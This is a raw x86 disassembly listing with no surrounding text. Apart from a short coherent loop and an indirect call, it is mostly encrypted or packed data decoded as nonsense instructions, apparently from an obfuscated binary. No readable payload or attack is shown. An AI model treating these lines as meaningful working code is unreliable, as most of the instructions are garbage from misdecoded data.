  4028fa:	jo     0x4028e5
  4028fc:	cmp    al,0x8d
  4028fe:	dec    al
  402900:	xlat   BYTE PTR ds:[ebx]
  402901:	mov    esi,0xe684e050
  402906:	clc    
  402907:	sub    DWORD PTR [edx+0x67],ecx
  40290a:	xor    al,0x5e
  40290c:	stc    
  40290d:	sbb    DWORD PTR [ebp+0xa],ebp
  402910:	xchg   ebp,eax
  402911:	ret    
  402912:	arpl   WORD PTR [eax],sp
  402914:	adc    al,0xe8
  402916:	out    dx,al
  402917:	call   0x401d927e
  40291c:	xor    eax,0x40a81773
  402921:	or     ebx,DWORD PTR [esi+0x122ffc1d]
  402927:	inc    edx
  402928:	cmp    DWORD PTR [ebx-0x212bd33e],ecx
  40292e:	dec    edx
  40292f:	jne    0x402979
  402931:	lds    ecx,FWORD PTR [edx+0x1c]
  402934:	iret   
  402935:	(bad)  
  402936:	cld    
  402937:	dec    ecx
  402938:	ret    
  402939:	ret    0x7eeb
  40293c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40293d:	mov    ch,0xf2
  40293f:	(bad)  
  402940:	int    0xff
  402942:	mov    es,ecx
  402944:	xchg   BYTE PTR ds:0xc7fa3b62,bh
  40294a:	add    eax,0x434412
  40294f:	pop    edi
  402950:	push   esp
  402951:	add    BYTE PTR [eax],al
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432e5e,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43441e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43441e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43441e,edi
  402989:	cmp    DWORD PTR ds:0x43441e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43441e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x4343fe
  4029ab:	push   0x4692
  4029b0:	push   0x4327b8
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432d6a
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432e66,0x432e3e
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x4343ea,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi+0x2c5711fc],ah
  402a13:	mov    ds:0x700c00a5,eax
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x4029bd
  402a1e:	dec    ebx
  402a1f:	jbe    0x402a72
  402a21:	into   
  402a22:	ret    0xf1b0
  402a25:	(bad)  
  402a26:	jno    0x402a6d
  402a28:	aaa    
  402a29:	and    al,0x8b
  402a2b:	add    esp,esi
  402a2d:	xchg   ebx,eax
  402a2e:	pop    esp
  402a2f:	lahf   
  402a30:	inc    eax
  402a31:	popf   
  402a32:	sahf   
  402a33:	ins    DWORD PTR es:[edi],dx
  402a34:	outs   dx,BYTE PTR ds:[esi]
  402a35:	cmp    ebx,esp
  402a37:	pop    edx
  402a38:	aas    
  402a39:	sbb    ecx,edx
  402a3b:	adc    al,0x42
  402a3d:	pop    ss
  402a3e:	inc    ecx
  402a3f:	out    dx,al
  402a40:	or     eax,0x9e3435c2
  402a45:	push   edi
  402a46:	sahf   
  402a47:	(bad)  
  402a48:	loopne 0x402a64
  402a4a:	das    
  402a4b:	xchg   edi,eax
  402a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a4d:	pop    ds
  402a4e:	xchg   ebp,esp
  402a50:	loop   0x402a1e
  402a52:	pop    esp
  402a53:	jbe    0x402a2a
  402a55:	out    dx,al
  402a56:	inc    ecx
  402a57:	fadd   QWORD PTR [ebx]
  402a59:	cdq    
  402a5a:	push   ss
  402a5b:	aas    
  402a5c:	in     al,dx
  402a5d:	add    ah,ch
  402a5f:	mov    dl,0xbf
  402a61:	je     0x4029fe
  402a63:	iret   
  402a64:	dec    ebx
  402a65:	sub    ah,BYTE PTR [eax+0x651e85c]
  402a6b:	xor    DWORD PTR ds:0x2b84a858,eax
  402a71:	or     al,BYTE PTR [esi-0x76bd6e08]
  402a77:	(bad)  
  402a78:	nop
  402a79:	xchg   edi,eax
  402a7a:	or     dh,BYTE PTR [edi+0x7a6cbd4d]
  402a80:	aas    
  402a81:	sbb    DWORD PTR [esp+eiz*4-0x1e37e3f4],eax
  402a88:	add    eax,0xc5382593
  402a8d:	stc    
  402a8e:	pusha  
  402a8f:	out    dx,al
  402a90:	and    al,0xff
  402a92:	loopne 0x402a91
  402a94:	call   0x6590c567
  402a99:	shl    DWORD PTR [edx-0x1],0x1b
  402a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a9e:	adc    ah,BYTE PTR [ecx-0x48878d74]
  402aa4:	in     al,0x80
  402aa6:	xlat   BYTE PTR ds:[ebx]
  402aa7:	outs   dx,DWORD PTR ds:[esi]
  402aa8:	xor    esi,DWORD PTR [eax+0x7d]
  402aab:	jg     0x402b2b
  402aad:	popa   
  402aae:	mov    ebx,0xd9f54e84
  402ab3:	imul   ecx,edi,0xffffffd7
  402ab6:	dec    ebx
  402ab7:	ds push ecx
  402ab9:	dec    edx
  402aba:	aad    0xe0
  402abc:	jno    0x402b3d
  402abe:	sbb    al,0xd8
  402ac0:	int3   
  402ac1:	std    
  402ac2:	xor    DWORD PTR [edx-0x80],eax
  402ac5:	(bad)  
  402ac6:	leave  
  402ac7:	test   BYTE PTR [eax+0x7e553ea9],bh
  402acd:	mov    dh,0xf0
  402acf:	push   esi
  402ad0:	dec    BYTE PTR [eax-0x7]
  402ad3:	sub    edx,DWORD PTR [ecx+0x45]
  402ad6:	or     BYTE PTR [ecx-0x62],dl
  402ad9:	sub    eax,0x2a9d0384
  402ade:	or     BYTE PTR [eax-0x70013818],0x35
  402ae5:	or     al,0x4b
  402ae7:	adc    eax,0x9365ffea
  402aec:	jg     0x402b69
  402aee:	sbb    DWORD PTR fs:[edi],ebp
  402af1:	sub    bl,BYTE PTR [ebx+0x4b081d37]
  402af7:	mov    al,0xf0
  402af9:	cld    
  402afa:	xchg   esi,eax
  402afb:	icebp  
  402afc:	aaa    
  402afd:	dec    ecx
  402afe:	je     0x402b67
  402b00:	jecxz  0x402a8d
  402b02:	inc    eax
  402b03:	mov    edi,0xb54eeea0
  402b08:	mov    eax,ds:0x27adb2e1
  402b0d:	in     eax,dx
  402b0e:	cwde   
  402b0f:	sti    
  402b10:	repnz ror DWORD PTR [esi+eiz*4],0xd6
  402b15:	(bad)  
  402b16:	repnz cmp edx,0x8559d65
  402b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b1e:	pop    esi
  402b1f:	cmp    ebp,DWORD PTR [edx+edx*4]
  402b22:	xchg   esi,eax
  402b23:	call   0x7945:0x1bed05ec
  402b2a:	mov    esi,DWORD PTR [edx+0x6063a891]
  402b30:	mov    DWORD PTR [esi-0x129a90d4],esi
  402b36:	fadd   QWORD PTR [ecx+0x31]
  402b39:	and    ah,BYTE PTR [esi-0x2d942756]
  402b3f:	loop   0x402b02
  402b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b43:	push   ebp
  402b44:	adc    esp,0x27
  402b47:	pusha  
  402b48:	xor    eax,0x9043b9e6
  402b4d:	adc    BYTE PTR [ecx],cl
  402b4f:	jnp    0x402b65
  402b51:	mov    al,ds:0xd73bd38
  402b56:	inc    ebp
  402b57:	into   
  402b58:	sub    eax,0x8726a3b2
  402b5d:	add    ch,BYTE PTR [edi+0x29]
  402b60:	push   edx
  402b61:	aad    0x3d
  402b63:	in     al,dx
  402b64:	sub    DWORD PTR ds:0x11750b0e,ebx
  402b6a:	pop    esi
  402b6b:	push   cs
  402b6c:	(bad)  
  402b6d:	mov    ch,0x48
  402b6f:	xor    ch,BYTE PTR [eax-0x6564d629]
  402b75:	aas    
  402b76:	push   cs
  402b77:	arpl   sp,si
  402b79:	sub    esp,DWORD PTR [edi]
  402b7b:	pusha  
  402b7c:	sub    edi,DWORD PTR [esi]
  402b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b7f:	arpl   WORD PTR [edx+0x55],dx
  402b82:	cmp    edi,DWORD PTR [edx]
  402b84:	xchg   esi,eax
  402b85:	(bad)  
  402b87:	sbb    BYTE PTR [esi-0x1cfc155f],0xe9
  402b8e:	cmp    bl,BYTE PTR [ecx-0x70]
  402b91:	and    al,0x5a
  402b93:	cmp    esp,DWORD PTR [esi]
  402b95:	fmul   DWORD PTR [ebp-0x5b]
  402b98:	mov    cl,0x8a
  402b9a:	daa    
  402b9b:	inc    esp
  402b9c:	addr16 es sub al,0xdd
  402ba0:	aas    
  402ba1:	mov    BYTE PTR [ebp+0x5ab8ae88],dl
  402ba7:	cdq    
  402ba8:	imul   esi,ebx,0xf56e2c88
  402bae:	xlat   BYTE PTR ds:[ebx]
  402baf:	sub    DWORD PTR [eax],ebp
  402bb1:	inc    edi
  402bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bb3:	and    cl,al
  402bb5:	cmp    BYTE PTR [esi-0x40a07925],dh
  402bbb:	call   0xcf2af504
  402bc0:	mov    eax,ds:0xe5932a96
  402bc5:	mov    edi,0xe41a3c5b
  402bca:	fldcw  WORD PTR [ecx]
  402bcc:	add    DWORD PTR [ebx+eiz*8+0x27e4feff],esi
  402bd3:	xchg   ebx,eax
  402bd4:	mov    ch,0x80
  402bd6:	lds    ecx,FWORD PTR ds:0x8010741c
  402bdc:	mov    eax,ds:0x41de49d8
  402be1:	pushf  
  402be2:	jo     0x402be5
  402be4:	mov    BYTE PTR ds:0x90bd3584,0xd8
  402beb:	sub    DWORD PTR [ebx],edx
  402bed:	fnstcw WORD PTR es:[ebp+0x6adec273]
  402bf4:	push   esp
  402bf5:	pop    ecx
  402bf6:	sbb    BYTE PTR ds:[ecx+0x5a],ch
  402bfa:	cmp    eax,0xe62aa99f
  402bff:	mov    eax,0x81694651
  402c04:	or     cl,BYTE PTR [edi-0x74]
  402c07:	imul   ebx,ecx,0xfffffff5
  402c0a:	scas   eax,DWORD PTR es:[edi]
  402c0b:	push   cs
  402c0c:	and    al,0xa0
  402c0e:	pop    ss
  402c0f:	dec    edx
  402c10:	mov    ds:0xe44c66c9,al
  402c15:	(bad)  
  402c16:	iret   
  402c17:	mov    dl,0x5f
  402c19:	les    edx,FWORD PTR [eax+0x6e27c052]
  402c1f:	dec    esi
  402c20:	gs jne 0x402c77
  402c23:	sub    edi,ecx
  402c25:	in     al,dx
  402c26:	sahf   
  402c27:	mov    bl,0x67
  402c29:	fild   DWORD PTR [edi]
  402c2b:	pop    edx
  402c2c:	jae    0x402c61
  402c2e:	call   0x631feb
  402c33:	adc    ch,BYTE PTR [eax+0x45]
  402c36:	ja     0x402c94
  402c38:	stos   BYTE PTR es:[edi],al
  402c39:	popf   
  402c3a:	jo     0x402c8c
  402c3c:	jge    0x402bf4
  402c3e:	call   0x3c0e:0xa15cec63
  402c45:	add    al,0xd9
  402c47:	dec    esp
  402c48:	nop
  402c49:	icebp  
  402c4a:	ret    0x1f61
  402c4d:	lahf   
  402c4e:	fldcw  WORD PTR [esi]
  402c50:	or     bl,BYTE PTR [esi]
  402c52:	mov    esi,0x6ef98eda
  402c57:	ret    0x60f2
  402c5a:	sbb    bl,ah
  402c5c:	jne    0x402c94
  402c5e:	pop    ds
  402c5f:	rol    esi,cl
  402c61:	jb     0x402c4c
  402c63:	sub    ecx,DWORD PTR [edx+0x6589af84]
  402c69:	adc    al,0x57
  402c6b:	jns    0x402c2f
  402c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6e:	sar    BYTE PTR [ecx-0x60],1
  402c71:	xchg   ebp,eax
  402c72:	dec    edi
  402c73:	mov    ds:0x32112f2d,al
  402c78:	scas   eax,DWORD PTR es:[edi]
  402c79:	mov    edx,0xb27d002f
  402c7e:	jp     0x402cd8
  402c80:	sub    al,BYTE PTR [ecx+0x7c65ea06]
  402c86:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402c88:	pop    ds
  402c89:	(bad)  
  402c8a:	xlat   BYTE PTR ds:[ebx]
  402c8b:	mov    WORD PTR [eax+0x196e1778],cs
  402c91:	xchg   ebp,eax
  402c92:	enter  0x8605,0xa6
  402c96:	lock in al,dx
  402c98:	or     ch,ah
  402c9a:	shl    DWORD PTR [edi+0x45a6a552],0x7f
  402ca1:	xchg   DWORD PTR [esi-0x4c9058cd],ecx
  402ca7:	test   al,0x35
  402ca9:	pop    ecx
  402caa:	seto   ah
  402cad:	pop    esp
  402cae:	jge    0x402ca1
  402cb0:	dec    esp
  402cb1:	loopne 0x402d17
  402cb3:	jo     0x402ccd
  402cb5:	enter  0x20b8,0xb4
  402cb9:	test   al,0xc7
  402cbb:	aad    0xee
  402cbd:	sub    BYTE PTR [edx+0x1826be8a],ch
  402cc3:	mov    BYTE PTR [eax-0x360ad34d],ah
  402cc9:	ror    cl,0xd7
  402ccc:	pop    ebx
  402ccd:	and    eax,0xb4746ea3
  402cd2:	jbe    0x402ce8
  402cd4:	and    al,0xc9
  402cd6:	pusha  
  402cd7:	hlt    
  402cd8:	das    
  402cd9:	mov    ds:0xeea401fc,al
  402cde:	fucomp st(3)
  402ce0:	dec    edi
  402ce1:	jo     0x402c7f
  402ce3:	aam    0x85
  402ce5:	adc    DWORD PTR [esi-0x4ebda38e],0x31
  402cec:	add    eax,DWORD PTR [ecx+0x30380265]
  402cf2:	jmp    0x402c98
  402cf4:	adc    eax,0x400f968c
  402cf9:	cmp    ebx,DWORD PTR [ebp+0x2d089d2d]
  402cff:	pop    edx
  402d00:	inc    ecx
  402d01:	scas   eax,DWORD PTR es:[edi]
  402d02:	jnp    0x402cb7
  402d04:	and    bl,BYTE PTR [ebx-0x5c]
  402d07:	mov    dl,ah
  402d09:	adc    DWORD PTR [esi+0x398af5af],ebx
  402d0f:	test   BYTE PTR [edi-0x249fdc83],al
  402d15:	cmp    BYTE PTR [esi],ah
  402d17:	inc    esp
  402d18:	retf   0x3af
  402d1b:	push   ebx
  402d1c:	xlat   BYTE PTR ds:[ebx]
  402d1d:	xlat   BYTE PTR ds:[ebx]
  402d1e:	std    
  402d1f:	ja     0x402d9d
  402d21:	lods   eax,DWORD PTR ds:[esi]
  402d22:	scas   al,BYTE PTR es:[edi]
  402d23:	and    eax,0x77816db8
  402d28:	retf   
  402d29:	xchg   esp,eax
  402d2a:	jg     0x402d1f
  402d2c:	retf   
  402d2d:	leave  
  402d2e:	outs   dx,BYTE PTR ds:[esi]
  402d2f:	sub    al,0xf
  402d31:	cwde   
  402d32:	xchg   esp,eax
  402d33:	fisubr WORD PTR [esi]
  402d35:	cmp    BYTE PTR [esi],bl
  402d37:	or     eax,0x3b76c81a
  402d3c:	sar    BYTE PTR [esi],1
  402d3e:	test   eax,0x640d05da
  402d43:	jae    0x402ccc
  402d45:	dec    edx
  402d46:	jmp    0x4d5f:0xd326e7a4
  402d4d:	mov    ecx,0xa823c08e
  402d52:	inc    edi
  402d53:	add    BYTE PTR [ebp-0x3a],al
  402d56:	int3   
  402d57:	mov    ds:0x8dd881b1,al
  402d5c:	dec    edi
  402d5d:	stos   DWORD PTR es:[edi],eax
  402d5e:	je     0x402d1d
  402d60:	xor    ebp,DWORD PTR [esi-0xd]
  402d63:	rol    BYTE PTR [edi],cl
  402d65:	sub    BYTE PTR [edi],ah
  402d67:	cmp    ebp,esp
  402d69:	or     ebx,edi
  402d6b:	sahf   
  402d6c:	es mov edi,0x4a7174b5
  402d72:	pop    ecx
  402d73:	shr    DWORD PTR [ebx+0x5a],1
  402d76:	repz call 0xce61342c
  402d7c:	cdq    
  402d7d:	push   ebp
  402d7e:	ret    
  402d7f:	jns    0x402d62
  402d81:	fbld   TBYTE PTR [esi+ecx*1-0x31]
  402d85:	scas   al,BYTE PTR es:[edi]
  402d86:	icebp  
  402d87:	sub    ebx,DWORD PTR [esi]
  402d89:	adc    ah,BYTE PTR [edi]
  402d8b:	stos   BYTE PTR es:[edi],al
  402d8c:	sbb    DWORD PTR [eax+0x66d35919],ebp
  402d92:	stos   BYTE PTR es:[edi],al
  402d93:	push   ds
  402d94:	iret   
  402d95:	mov    ecx,DWORD PTR [ecx-0xc98793b]
  402d9b:	mov    ds:0x2d5e52bb,al
  402da0:	mov    WORD PTR [eax+0xe],fs
  402da3:	ret    0x1075
  402da6:	cwde   
  402da7:	add    edi,DWORD PTR [esi+0x77]
  402daa:	push   esp
  402dab:	sahf   
  402dac:	loopne 0x402e11
  402dae:	loop   0x402d9a
  402db0:	les    ecx,FWORD PTR [ebp+0x6598aa24]
  402db6:	mov    edi,DWORD PTR [ebp-0x4]
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	push   es
  402dcb:	xor    DWORD PTR [ebx+0x7009a74e],edi
  402dd1:	jo     0x402d6a
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402d7a
  402dd7:	in     al,0xdf
  402dd9:	lock lds ebp,FWORD PTR [edi]
  402ddc:	(bad)  
  402ddd:	sahf   
  402dde:	lods   eax,DWORD PTR ds:[esi]
  402ddf:	pop    edi
  402de0:	xchg   esi,eax
  402de1:	rcl    ah,1
  402de3:	sub    DWORD PTR [eax+0x45],0x4
  402de7:	imul   esi,DWORD PTR [edi],0xc3dfe56f
  402ded:	(bad)  
  402dee:	inc    esi
  402def:	sahf   
  402df0:	push   cs
  402df1:	mov    esp,?
  402df3:	pop    edx
  402df4:	push   es
  402df5:	dec    ebp
  402df6:	ror    BYTE PTR [edi-0x2e4ac24],cl
  402dfc:	call   0x6a84:0x7a89b6d6
  402e03:	mov    ecx,0xaff52c9e
  402e08:	aas    
  402e09:	inc    edx
  402e0a:	shl    dl,0xba
  402e0d:	dec    eax
  402e0e:	dec    eax
  402e0f:	in     al,0xac
  402e11:	int3   
  402e12:	xchg   DWORD PTR [edx+ebp*8+0x335306c5],ebx
  402e19:	imul   ebx,edx
  402e1c:	in     eax,0x97
  402e1e:	das    
  402e1f:	dec    esi
  402e20:	hlt    
  402e21:	ret    
  402e22:	sub    eax,DWORD PTR [edi-0x3]
  402e25:	and    DWORD PTR [esi],ebp
  402e27:	sahf   
  402e28:	xor    DWORD PTR [edx-0x4f],edx
  402e2b:	sti    
  402e2c:	outs   dx,BYTE PTR ds:[esi]
  402e2d:	int    0x38
  402e2f:	lods   al,BYTE PTR ds:[esi]
  402e30:	and    al,0x2b
  402e32:	test   al,0x58
  402e34:	loopne 0x402e62
  402e36:	popa   
  402e37:	cmp    edx,DWORD PTR [esi-0x3]
  402e3a:	loop   0x402e15
  402e3c:	adc    al,0x3f
  402e3e:	inc    eax
  402e3f:	pop    edx
  402e40:	jb     0x402e19
  402e42:	scas   eax,DWORD PTR es:[edi]
  402e43:	sbb    ebx,DWORD PTR [ebp+esi*1+0x4940ef57]
  402e4a:	loope  0x402df4
  402e4c:	xchg   edx,eax
  402e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e4e:	jbe    0x402e29
  402e50:	imul   esi,DWORD PTR [esi-0x79b39178],0xb4293df9
  402e5a:	mov    ch,0x6
  402e5c:	test   eax,0xa89cc76
  402e61:	sbb    eax,0xcc908861
  402e66:	and    ebx,edi
  402e68:	xchg   esi,eax
  402e69:	mov    al,0x67
  402e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e6c:	in     al,dx
  402e6d:	jne    0x402ee0
  402e6f:	in     eax,dx
  402e70:	retf   0xb281
  402e73:	(bad)  
  402e74:	xchg   ebp,eax
  402e75:	sub    al,0x68
  402e77:	xchg   edi,eax
  402e78:	arpl   bp,di
  402e7a:	pop    esi
  402e7b:	push   esi
  402e7c:	dec    esp
  402e7d:	add    DWORD PTR [edx-0x17],ebx
  402e80:	push   ebx
  402e81:	test   al,0x8d
  402e83:	adc    al,0x22
  402e85:	mov    bh,0x18
  402e87:	ret    0x9d97
  402e8a:	iret   
  402e8b:	sub    DWORD PTR [eax-0x9],edi
  402e8e:	outs   dx,BYTE PTR ds:[esi]
  402e8f:	sbb    eax,0x875996e3
  402e94:	ins    BYTE PTR es:[edi],dx
  402e95:	and    eax,0x398aa374
  402e9a:	pop    ss
  402e9b:	mov    bl,0x33
  402e9d:	add    eax,0xf0432659
  402ea2:	retf   0x9133
  402ea5:	test   BYTE PTR [edx-0x5f0a2e75],cl
  402eab:	push   eax
  402eac:	dec    esp
  402ead:	aad    0xfb
  402eaf:	data16 std 
  402eb1:	fld    TBYTE PTR [edi-0x6071ea58]
  402eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb8:	(bad)  [ebp-0x1b]
  402ebb:	pop    esp
  402ebc:	(bad)  
  402ebd:	xor    DWORD PTR [ebx],esi
  402ebf:	xchg   BYTE PTR [edi],bh
  402ec1:	test   BYTE PTR [esi],ah
  402ec3:	inc    esi
  402ec4:	dec    esp
  402ec5:	add    eax,0xb9ff1199
  402eca:	iret   
  402ecb:	imul   esi,esp,0x17c49744
  402ed1:	inc    esp
  402ed2:	test   DWORD PTR [ebx],esp
  402ed4:	cmp    DWORD PTR [ebp-0x70],0x13b6a4fb
  402edb:	cdq    
  402edc:	fild   DWORD PTR [edx+0x61]
  402edf:	das    
  402ee0:	xchg   DWORD PTR [esp+ecx*1],esi
  402ee3:	lods   eax,DWORD PTR ds:[esi]
  402ee4:	and    BYTE PTR [edx-0x35],ah
  402ee7:	call   DWORD PTR [ebp-0x68652f9f]
  402eed:	pop    ebp
  402eee:	push   ss
  402eef:	xchg   DWORD PTR [eax],esp
  402ef1:	std    
  402ef2:	dec    eax
  402ef3:	lods   al,BYTE PTR ds:[esi]
  402ef5:	ret    0xf79c
  402ef8:	mov    edi,0x6275e527
  402efd:	repnz mov bh,0x6b
  402f00:	xlat   BYTE PTR ds:[ebx]
  402f01:	xlat   BYTE PTR ds:[ebx]
  402f02:	bound  ecx,QWORD PTR cs:[edx+ecx*1-0x51]
  402f07:	cld    
  402f08:	mov    cl,0x1d
  402f0a:	cmp    eax,0x885dc35a
  402f0f:	mov    BYTE PTR [esi+ecx*8+0x31],bl
  402f13:	pop    esp
  402f14:	jnp    0x402eb4
  402f16:	test   BYTE PTR [esi],al
  402f18:	push   esp
  402f19:	xchg   edi,eax
  402f1a:	mov    dh,0xa3
  402f1c:	lods   eax,DWORD PTR ds:[esi]
  402f1d:	pop    ecx
  402f1e:	sar    BYTE PTR [ebp-0x279839ae],cl
  402f24:	das    
  402f25:	loopne 0x402eb6
  402f27:	ror    DWORD PTR [ebx+eax*8+0x777b391e],1
  402f2e:	ret    
  402f2f:	mov    dh,0x72
  402f31:	scas   al,BYTE PTR es:[edi]
  402f32:	enter  0x4399,0x3f
  402f36:	out    0xcf,eax
  402f38:	xlat   BYTE PTR ds:[ebx]
  402f39:	rcl    DWORD PTR [esi],1
  402f3b:	ss into 
  402f3d:	push   ebx
  402f3e:	sti    
  402f3f:	lods   al,BYTE PTR ds:[esi]
  402f40:	hlt    
  402f41:	pop    ss
  402f42:	mov    ch,al
  402f44:	loop   0x402fb8
  402f46:	add    BYTE PTR [ecx+0x7],dh
  402f49:	mov    ecx,DWORD PTR [esi+0x8]
  402f4c:	sahf   
  402f4d:	outs   dx,DWORD PTR ds:[esi]
  402f4e:	repz dec ebx
  402f50:	mov    eax,ds:0x22e800ac
  402f55:	mov    dl,0x8c
  402f57:	adc    al,0x1d
  402f59:	and    edi,DWORD PTR [esi-0x7a]
  402f5c:	cmp    eax,0x3595ef30
  402f61:	mov    esp,0xbc9d7e27
  402f66:	jnp    0x402fcb
  402f68:	cmp    ebx,DWORD PTR [ecx]
  402f6a:	ins    DWORD PTR es:[edi],dx
  402f6b:	ins    DWORD PTR es:[edi],dx
  402f6c:	mov    bh,0x29
  402f6e:	jbe    0x402f74
  402f70:	outs   dx,BYTE PTR ds:[esi]
  402f71:	(bad)  
  402f73:	sub    ebx,eax
  402f75:	lods   eax,DWORD PTR ds:[esi]
  402f76:	daa    
  402f77:	jmp    0xc380:0x6f7764ca
  402f7e:	jmp    0xd27ffbb2
  402f83:	adc    BYTE PTR [ebx-0x64cd8f0c],dh
  402f89:	add    eax,0x6b20b990
  402f8e:	pop    ebp
  402f8f:	data16 loop 0x402fca
  402f92:	pop    ecx
  402f93:	push   eax
  402f94:	pop    es
  402f95:	xchg   ecx,eax
  402f96:	inc    esp
  402f97:	xor    eax,0xaba255d
  402f9c:	mov    dh,0xd6
  402f9e:	popa   
  402f9f:	imul   edi,ebx,0xffffffb4
  402fa2:	int3   
  402fa3:	test   BYTE PTR [ecx+eiz*4],bl
  402fa6:	jo     0x402f92
  402fa8:	(bad)  
  402fa9:	mov    ds:0x7c0034aa,al
  402fae:	xchg   esi,eax
  402faf:	aad    0x0
  402fb1:	jnp    0x402ff6
  402fb3:	or     al,0x31
  402fb5:	fldcw  WORD PTR [ebp-0x38bc982b]
  402fbb:	sub    ebp,ebp
  402fbd:	dec    eax
  402fbe:	mov    edx,0x360f1027
  402fc3:	dec    ebp
  402fc4:	out    dx,al
  402fc5:	test   eax,0x7f7495e
  402fca:	or     DWORD PTR [edx+edx*1],0x5
  402fce:	mov    ebx,0x3dafb99d
  402fd3:	outs   dx,BYTE PTR ds:[esi]
  402fd4:	mov    dh,0xbd
  402fd6:	mov    esp,0xece1fd0a
  402fdb:	or     esi,edx
  402fdd:	loopne 0x402fcd
  402fdf:	fwait
  402fe0:	and    ecx,ebx
  402fe2:	lods   al,BYTE PTR ds:[esi]
  402fe3:	and    eax,0x1b881db5
  402fe8:	push   ebx
  402fe9:	cdq    
  402fea:	xchg   ebx,eax
  402feb:	xor    al,0x80
  402fed:	aad    0xb9
  402fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff0:	adc    DWORD PTR [ebp-0x3ff9854f],ecx
  402ff6:	lea    edx,[ebx-0xe363ec9]
  402ffc:	gs popf 
  402ffe:	dec    ecx
  402fff:	mov    bh,0x52
  403001:	repnz (bad) 
  403003:	imul   edi,DWORD PTR [ebx+eiz*8],0x6e9dc43b
  40300a:	dec    esp
  40300b:	push   0xffffffef
  40300d:	and    dl,BYTE PTR [ebp-0x3466f4d8]
  403013:	fsubr  DWORD PTR [esi-0x5f8a157f]
  403019:	rcr    DWORD PTR [eax+eiz*4-0x42],cl
  40301d:	xor    BYTE PTR [esi-0x55],0xa
  403021:	(bad)  
  403022:	cs ret 0xefe4
  403026:	push   0xe7ca6e4
  40302b:	imul   esp,DWORD PTR [ebx],0xc5ef054c
  403031:	enter  0xc4b,0xc2
  403035:	jle    0x402fd3
  403037:	jb     0x40300d
  403039:	ror    ah,1
  40303b:	pop    ds
  40303c:	dec    ebp
  40303d:	push   esp
  40303e:	imul   edx,DWORD PTR ds:0x39631a7e,0x0
  403045:	xchg   ebx,eax
  403046:	xor    al,0x1
  403048:	stos   BYTE PTR es:[edi],al
  403049:	clc    
  40304a:	and    edi,DWORD PTR [edx*2+0x7f0c32bd]
  403051:	pop    es
  403052:	sub    BYTE PTR [eax-0x620aa6a6],dl
  403058:	cli    
  403059:	jbe    0x403068
  40305b:	xor    al,0x2d
  40305d:	cdq    
  40305e:	test   eax,0xe75c14d2
  403063:	jne    0x40305c
  403065:	scas   al,BYTE PTR es:[edi]
  403066:	pop    edi
  403067:	call   DWORD PTR [ebx-0x8]
  40306a:	ficom  DWORD PTR ds:0xf4485a55
  403070:	mov    cl,0xdb
  403072:	gs or  eax,0x2d021320
  403078:	inc    edx
  403079:	(bad)  
  40307a:	push   ds
  40307b:	stos   DWORD PTR es:[edi],eax
  40307c:	inc    ebp
  40307d:	and    eax,0xe9573796
  403082:	pop    esi
  403083:	push   eax
  403084:	nop
  403085:	ins    DWORD PTR es:[edi],dx
  403086:	dec    edi
  403087:	xor    eax,0x6f9193a9
  40308c:	add    al,0xb9
  40308e:	and    DWORD PTR [edx],esp
  403090:	jmp    0x6619:0x90419a1f
  403097:	mul    DWORD PTR [eax]
  403099:	jne    0x40305a
  40309b:	push   0x3be1a73
  4030a0:	mov    ecx,0x7d7c955b
  4030a5:	or     BYTE PTR [edi+edx*4],0xdb
  4030a9:	mov    ah,0x9f
  4030ab:	mov    dl,0xcc
  4030ad:	ficom  DWORD PTR [edx]
  4030af:	sub    al,0xdc
  4030b1:	cmp    ebp,DWORD PTR [edx+0x235b16bf]
  4030b7:	aaa    
  4030b8:	rcr    DWORD PTR [ebx],1
  4030ba:	inc    esp
  4030bb:	push   ds
  4030bc:	push   ebx
  4030bd:	iret   
  4030be:	enter  0x88dc,0x94
  4030c2:	cmc    
  4030c3:	or     DWORD PTR [edi+0x7c],esi
  4030c6:	fsincos 
  4030c8:	push   es
  4030c9:	push   edx
